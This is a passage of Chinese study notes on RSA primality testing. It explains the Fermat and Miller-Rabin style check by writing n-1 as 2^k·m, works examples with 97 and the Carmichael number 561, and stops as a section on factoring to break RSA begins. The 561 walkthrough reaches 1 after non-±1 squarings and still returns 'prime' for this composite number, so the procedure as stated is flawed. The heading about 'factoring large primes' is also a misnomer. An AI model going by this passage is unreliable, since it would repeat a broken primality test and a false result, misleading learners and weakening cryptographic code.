mtight">(</span><span class="mord mathdefault mtight">n</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord mathdefault">n</span></span></span></span></p></blockquote><p>因为素数满足费马定理，所以费马测试就去测试一个数n，若<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>a</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msup><mo>=</mo><mn>1</mn><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">a^{n-1}=1\ mod\ n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord mathdefault">n</span></span></span></span>，则n被判定为一个素数。</p><p>我们很容易就容易发现，这是一个偏是的测试，因为有一些合数也会满足费马测试，它们被称为伪素数。</p><p>然后式子的测试过程中，为了简便操作，将<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">n-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>分解为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mn>2</mn><mi>k</mi></msup><mi>m</mi></mrow><annotation encoding="application/x-tex">2^km</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.849108em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mord mathdefault">m</span></span></span></span>（m为奇数）。第一眼看可能感觉这个<code>n-1</code>不一定能分解为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mn>2</mn><mi>k</mi></msup><mi>m</mi></mrow><annotation encoding="application/x-tex">2^km</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.849108em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mord mathdefault">m</span></span></span></span>，但是由于k应该可以取0，所以是一定能够分解的。</p><p>费马测试中就去计算<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>b</mi><mo>=</mo><msup><mi>a</mi><mi>m</mi></msup></mrow><annotation encoding="application/x-tex">b=a^m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">b</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.664392em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">m</span></span></span></span></span></span></span></span></span></span></span>是不是1，如果是1，ok满足条件（这里b为-1貌似也可以，但是不知道为什么ppt里没写）。不满足则看<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>b</mi><mn>2</mn></msup><mo separator="true">,</mo><msup><mi>b</mi><mn>4</mn></msup><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">b^2,b^4,..</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.008548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span></span></span></span>是不是正负1，如果遇到了一个正负1，ok，满足条件。如果到最后<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>b</mi><msup><mn>2</mn><mi>k</mi></msup></msup></mrow><annotation encoding="application/x-tex">b^{2^k}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.01192em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.01192em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9270285714285713em;"><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span>都没有得到正负1，说明它是个合数。</p><p>这里举一个例子。</p><ol><li><p>取n为97，则n-1为96。96可以分解为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mn>2</mn><mn>5</mn></msup><mo>∗</mo><mn>3</mn></mrow><annotation encoding="application/x-tex">2^5*3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">3</span></span></span></span>，即<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>32</mn><mo>∗</mo><mn>3</mn></mrow><annotation encoding="application/x-tex">32*3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">3</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">3</span></span></span></span></p></li><li><p>随便取一个a，比如说2，则看<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>b</mi><mo>=</mo><msup><mi>a</mi><mi>m</mi></msup><mo>=</mo><msup><mn>2</mn><mn>3</mn></msup><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mn>97</mn></mrow><annotation encoding="application/x-tex">b=a^m=2^{3}\ mod\ 97</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">b</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.664392em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">m</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord">9</span><span class="mord">7</span></span></span></span>是不是1。</p><p><img src="https://upyun.wuuconix.link/image-20211013221421808.png" alt="8" /></p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>b</mi><mo>=</mo><mn>8</mn></mrow><annotation encoding="application/x-tex">b=8</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">b</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">8</span></span></span></span>，不是1，则继续。</p></li><li><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>b</mi><mn>2</mn></msup><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mn>97</mn><mo>=</mo><mn>64</mn></mrow><annotation encoding="application/x-tex">b^2\ mod\ 97=64</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord">9</span><span class="mord">7</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">6</span><span class="mord">4</span></span></span></span>。继续</p></li><li><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>b</mi><mn>4</mn></msup><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mn>97</mn><mo>=</mo><mn>22</mn></mrow><annotation encoding="application/x-tex">b^4\ mod\ 97=22</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord">9</span><span class="mord">7</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">2</span></span></span></span>。继续</p></li><li><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>b</mi><mn>8</mn></msup><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mn>97</mn><mo>=</mo><mn>96</mn><mo>=</mo><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">b^8\ mod\ 97=96=-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">8</span></span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord">9</span><span class="mord">7</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">9</span><span class="mord">6</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">−</span><span class="mord">1</span></span></span></span>。发现-1，测试完毕，输出“素数”。</p><p>这里再详细解释一下为什么遇到-1也能说素数，因为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>a</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msup><mo>=</mo><msup><mi>a</mi><mrow><msup><mn>2</mn><mi>k</mi></msup><mi>m</mi></mrow></msup><mo>=</mo><msup><mi>b</mi><msup><mn>2</mn><mi>k</mi></msup></msup></mrow><annotation encoding="application/x-tex">a^{n-1}=a^{2^km}=b^{2^k}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.01192em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.01192em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9270285714285713em;"><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mord mathdefault mtight">m</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.01192em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.01192em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9270285714285713em;"><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span>。当遇到<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>b</mi><msup><mn>2</mn><mi>x</mi></msup></msup></mrow><annotation encoding="application/x-tex">b^{2^x}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.87998em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.87998em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7385428571428572em;"><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight">x</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span>等于正负1时，最后的结果式子<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>b</mi><msup><mn>2</mn><mi>k</mi></msup></msup></mrow><annotation encoding="application/x-tex">b^{2^k}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.01192em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.01192em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9270285714285713em;"><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span> 实际就是又把-1平方了即便，最后的结果是1，满足费马定理，就判断该数为素数了。</p></li></ol><p>一个合数有四分之一的概率通过费马测试，我们可以通过取多个a的方式来降低误判的概率。但是有一些数，不管你取什么a，都能被判定为素数，这些数被成为<code>Carmichael</code>数，比如561,645,1105。</p><p>我们这里对561进行一轮费马测试来模拟一下，a还是取2。</p><ul><li><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>n</mi><mo>=</mo><mn>561</mn></mrow><annotation encoding="application/x-tex">n=561</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">5</span><span class="mord">6</span><span class="mord">1</span></span></span></span></p></li><li><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>n</mi><mo>−</mo><mn>1</mn><mo>=</mo><mn>560</mn></mrow><annotation encoding="application/x-tex">n-1=560</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">5</span><span class="mord">6</span><span class="mord">0</span></span></span></span></p></li><li><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>560</mn><mo>=</mo><msup><mn>2</mn><mn>4</mn></msup><mo>∗</mo><mn>35</mn></mrow><annotation encoding="application/x-tex">560=2^4*35</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">5</span><span class="mord">6</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">3</span><span class="mord">5</span></span></span></span></p></li><li><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>b</mi><mo>=</mo><msup><mi>a</mi><mi>m</mi></msup><mo>=</mo><msup><mn>2</mn><mn>35</mn></msup><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mn>561</mn><mo>=</mo><mn>263</mn></mrow><annotation encoding="application/x-tex">b=a^m=2^{35}\ mod\ 561=263</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">b</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.664392em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">m</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">5</span></span></span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord">5</span><span class="mord">6</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">6</span><span class="mord">3</span></span></span></span></p></li><li><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>b</mi><mn>2</mn></msup><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mn>561</mn><mo>=</mo><mn>166</mn></mrow><annotation encoding="application/x-tex">b^2\ mod\ 561=166</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord">5</span><span class="mord">6</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">6</span><span class="mord">6</span></span></span></span></p></li><li><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>b</mi><mn>4</mn></msup><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mn>561</mn><mo>=</mo><mn>67</mn></mrow><annotation encoding="application/x-tex">b^4\ mod\ 561=67</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord">5</span><span class="mord">6</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">6</span><span class="mord">7</span></span></span></span></p></li><li><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>b</mi><mn>8</mn></msup><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mn>561</mn><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">b^8\ mod\ 561=1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">8</span></span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord">5</span><span class="mord">6</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span></p><p>返回“素数”</p></li></ul><h3 id="分解大素数"><a class="markdownIt-Anchor" href="#分解大素数"></a> 分解大素数</h3><p>其实RSA知道加密解密过程。然后了解平方乘算法来使指数运算称为现实，再利用费马测试来选择一个素数后，我们已经了解完RSA了。</p><p>接下来讲的分解大素数，该知识点应用在破解RSA密码中，也就是我们不知道<code>d,p,q</code>，我们只知道<span class="katex"><span 